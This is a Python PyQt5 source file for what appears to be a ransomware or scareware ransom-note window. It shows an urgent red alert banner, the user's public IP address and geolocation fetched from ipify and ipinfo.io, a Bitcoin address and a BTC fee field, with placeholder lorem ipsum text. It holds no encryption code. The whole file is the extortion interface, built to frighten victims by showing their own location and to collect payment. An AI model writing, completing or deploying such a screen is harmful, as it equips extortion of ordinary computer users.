import sys
import os

import requests
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QVBoxLayout, QHBoxLayout, QTextEdit, QGridLayout
from PyQt5.QtGui import QPixmap, QTextCursor, QColor, QImage, QPainter
from PyQt5.QtCore import Qt
from dotenv import load_dotenv

load_dotenv()


class MyApp(QWidget):
    def __init__(self):
        super().__init__()
        style_sheet = 'background-color: #232323; color: white;'
        self.setStyleSheet(style_sheet)
        self.setWindowTitle("My App")
        self.setGeometry(100, 100, 1000, 700)  # Set your preferred window size
        self.setWindowFlag(Qt.WindowMaximizeButtonHint, False)
        self.access_token = os.environ.get("ACCESS_TOKEN")
        self.base_route = "../assets/"
        self.local_messages = {
            "alert_message": "SOME URGENT MESSAGE HERE",
            "info_message": "Lorem ipsum dolor sit amet",
            "red_heading": "Insert some red text here",
            "right_side_description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua, incididunt ut labore et dolore magna aliqua. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod",
            "bitcoin_address": "Here bitcoin address:",
            "bitcoin_fee": "Here a fee in BTC:"
        }
        self.init_ui()

    @staticmethod
    def get_public_ip():
        try:
            response = requests.get('https://api64.ipify.org?format=json')
            data = response.json()
            return data['ip']
        except Exception as e:
            return f"Error: {str(e)}"

    def get_info(self):
        ip_address = self.get_public_ip()
        url = f"https://ipinfo.io/{ip_address}?token={self.access_token}"
        response = requests.get(url)
        data = response.json()
        print(data)

        information = f"IP: {data['ip']}\n" \
                      f"City: {data.get('city', 'N/A')}\n" \
                      f"Region: {data.get('region', 'N/A')}\n" \
                      f"Country: {data.get('country', 'N/A')}\n" \
                      f"Location: {data.get('loc', 'N/A')}\n" \
                      f"Postal Code: {data.get('postal', 'N/A')}\n" \
                      f"Timezone: {data.get('timezone', 'N/A')}\n" \
                      f"Org: {data.get('company', {}).get('domain', 'N/a')}\n" \
                      f"ASN: {data.get('asn', {}).get('name', 'N/A')}"
        return information

    @staticmethod
    def chunk_string(string, chunk_size):
        words = string.split()
        return [' '.join(words[i:i + chunk_size]) for i in range(0, len(words), chunk_size)]

    @staticmethod
    def apply_white_filter(image_path, target_color):
        pixmap = QPixmap(image_path)
        image = pixmap.toImage()

        # Get the target color
        target_qcolor = QColor(*target_color)

        # Create a new QImage with the same size and format as the original
        new_image = QImage(image.size(), QImage.Format_ARGB32)
        new_image.fill(Qt.white)  # Fill the new image with white

        # Use QPainter to draw the original image onto the new image, replacing the target color with white
        painter = QPainter(new_image)
        for y in range(image.height()):
            for x in range(image.width()):
                pixel_color = QColor(image.pixel(x, y))
                if pixel_color == target_qcolor:
                    new_image.setPixel(x, y, QColor(Qt.white).rgba())
                else:
                    new_image.setPixel(x, y, image.pixel(x, y))

        painter.end()

        return QPixmap.fromImage(new_image)

    def init_ui(self):
        # Top Placeholder Banner Image
        banner_image_path = f"{self.base_route}banner.png"  # Replace with actual path
        banner_label = QLabel()
        banner_pixmap = QPixmap(banner_image_path)
        banner_pixmap = banner_pixmap.scaled(800, 100, Qt.KeepAspectRatio)
        banner_label.setFixedHeight(100)
        banner_label.setPixmap(banner_pixmap)
        banner_label.setScaledContents(True)

        alert_label = QLabel()
        alert_label.setStyleSheet('font-size: 20px; font-weight: 700; background-color: red; color: white;')
        alert_label.setAlignment(Qt.AlignCenter)
        alert_label.setFixedHeight(38)

        # Image Widgets
        left_image = QLabel()
        right_image = QLabel()

        image_width = 20
        image_height = 20
        left_image_path = f"{self.base_route}alert.png"
        left_image_path = self.apply_white_filter(left_image_path, (128, 128, 128) )

        left_pixmap = QPixmap(left_image_path).scaled(image_width, image_height)
        right_pixmap = QPixmap(left_image_path).scaled(image_width, image_height)

        left_image.setPixmap(left_pixmap)
        right_image.setPixmap(right_pixmap)
        left_image.setAlignment(Qt.AlignCenter)
        right_image.setAlignment(Qt.AlignCenter)

        text_label = QLabel(f"{self.local_messages['alert_message']}")
        text_label.setStyleSheet('font-size: 23px; font-weight: 700; color: white;')

        alert_layout = QHBoxLayout()
        alert_layout.addWidget(left_image)
        alert_layout.addWidget(text_label)
        alert_layout.addWidget(right_image)
        alert_label.setLayout(alert_layout)

        info_label = QLabel(self.local_messages["info_message"])
        info_label.setStyleSheet('font-size: 18px; font-weight: 400; background-color: black; color: white;')
        info_label.setAlignment(Qt.AlignCenter)
        info_label.setFixedHeight(30)

        information = self.get_info()
        left_label = QLabel(information)
        left_label.setStyleSheet("font-size: 12pt; padding: 40px; padding-right: 80px;")

        right_widget = QWidget(self)
        right_widget.setStyleSheet("background-color: #e9edde; color: black; margin: 5px;")
        right_layout = QVBoxLayout(right_widget)
        right_layout.setContentsMargins(0, 0, 0, 0)
        heading_label = QLabel(self.local_messages["red_heading"], right_widget)
        heading_label_style = ("background-color: #232323; color: red; padding-bottom: 4px; padding-top: 0px;"
                               " font-size: 17px; font-weight: 700;")
        heading_label.setStyleSheet(heading_label_style)
        heading_label.setAlignment(Qt.AlignCenter)
        right_layout.addWidget(heading_label)

        description_label = QLabel("\n".join(self.chunk_string(self.local_messages["right_side_description"],
                                                               8)), right_widget)
        description_label.setStyleSheet("font-weight: 700; margin-left: 10px; font-size: 19px;")
        right_layout.addWidget(description_label)

        address_text = QTextEdit(right_widget)
        cursor = QTextCursor(address_text.document())
        cursor.movePosition(QTextCursor.End)

        image_path = f"{self.base_route}bitcoin.png"
        pixmap = QPixmap(image_path).scaled(50, 50, Qt.KeepAspectRatio)
        image = pixmap.toImage()
        cursor.insertImage(image)
        address_text.setReadOnly(True)
        bitcoin_address = self.local_messages["bitcoin_address"]
        bitcoin_fee = self.local_messages["bitcoin_fee"]
        address_text_style = ("padding: 20px; margin: 10px 0px 0px 10px; font-size: 19px; font-weight:700;"
                              " background-color: white; border: 1px solid grey; border-radius: 10px;")
        address_text.setStyleSheet(address_text_style)
        address_text.append(f"\n\n{bitcoin_address}")
        address_text.append(f"{bitcoin_fee}")

        graphic_representation = QLabel(right_widget)
        pixmap = QPixmap(f"{self.base_route}bitcoinpaymentmethod.png").scaled(150, 300)
        graphic_representation.setPixmap(pixmap)
        graphic_representation.setStyleSheet("margin-top: 9px;")

        text_and_image_layout = QHBoxLayout(right_widget)
        text_and_image_layout.setContentsMargins(0, 0, 0, 0)
        text_and_image_layout.setSpacing(0)

        text_and_image_layout.addWidget(address_text)
        text_and_image_layout.addWidget(graphic_representation)
        right_layout.addLayout(text_and_image_layout)

        image_grid_layout = QGridLayout()
        image_paths = [
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
            f"{self.base_route}bitcoinacceptedcompony.png",
        ]

        row = 0
        col = 0

        for path in image_paths:
            image_label = QLabel()
            image_label.setStyleSheet("margin-left: 10px; margin-bottom: 20px; margin-right: 5px;")
            pixmap = QPixmap(path).scaled(100, 50)
            image_label.setPixmap(pixmap)
            image_grid_layout.addWidget(image_label, row, col)

            col += 1
            if col == 4:
                col = 0
                row += 1

        right_layout.addLayout(image_grid_layout)

        # # Layout
        main_layout = QVBoxLayout(self)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.addWidget(banner_label)
        main_layout.addWidget(alert_label)
        main_layout.addWidget(info_label)

        columns_layout = QHBoxLayout()
        columns_layout.addWidget(left_label)
        columns_layout.addWidget(right_widget)
        main_layout.addLayout(columns_layout)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MyApp()
    window.setMaximumWidth(1000)
    window.setMinimumWidth(1000)
    window.setMaximumHeight(700)
    window.setMinimumHeight(700)
    window.show()
    sys.exit(app.exec_())
